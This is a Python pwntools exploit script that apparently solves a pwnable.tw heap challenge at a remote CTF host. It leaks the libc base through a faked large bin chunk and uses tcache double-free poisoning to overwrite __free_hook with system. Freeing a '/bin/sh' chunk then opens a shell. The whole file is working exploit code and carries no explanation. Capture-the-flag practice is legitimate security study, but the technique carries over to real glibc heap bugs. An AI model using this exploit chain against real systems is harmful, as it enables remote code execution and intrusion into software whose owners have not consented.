from pwn import *

#r = process("./T", env={"LD_PRELOAD" : "./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so"})
r = remote("chall.pwnable.tw", 10207)
def create(size, content):
    r.sendafter(b'choice :',b'1')
    r.sendafter(b'Size:',size)
    r.sendafter(b'Data:',content)

def free():
    r.sendafter(b'choice :',b'2')

### create a fake large bin at 0x602060 to leak libc
ptr_addr = 0x602088
chunks = 0x602760
r.sendafter(b'Name:',p64(0) + p64(0x701) + p64(0x6020a0) + p64(0x4546546) )
create(b'100',b'ccccc')
free() # 1
free() # 2
create(b'100',p64(chunks))
create(b'100',p64(chunks))
create(b'100',p64(0) + p64(0x21) + p64(0x00)*3 + p64(0x21) )   ### bottom of large bin to bypass check


create(b'110',b'ccccc')
free() # 3
free() # 4


create(b'110',p64(0x602070))
create(b'110',p64(0x602070))
create(b'110',p64(0x0)*3 + p64(0x602070) + p64(0x21)*2)

free() #5
r.sendafter(b'choice :',b'3')
r.recvuntil(b'Name :')
r.recv(16)
libc_base = u64(r.recv(6)+b'\x00\x00') - 0x3ebca0
success(f'{hex(libc_base)}') 

### malloc space in unsorted bins
for i in range(6):
    create(b'255',b'ccccc')
create(b'150','ccccc')
### gadget
system = libc_base + 0x4f440
bin_sh = libc_base + 0x1b3e9a
free_hook = libc_base + 0x3ed8e8
gadget = 0x4f322  + libc_base


### write system to free_hook
create(b'160','ccccc')
free() #6
free() #7
create(b'160',p64(free_hook))
create(b'160',p64(free_hook))
create(b'160',p64(system))


create(b'50',b'/bin/sh\x00')
free()

r.interactive()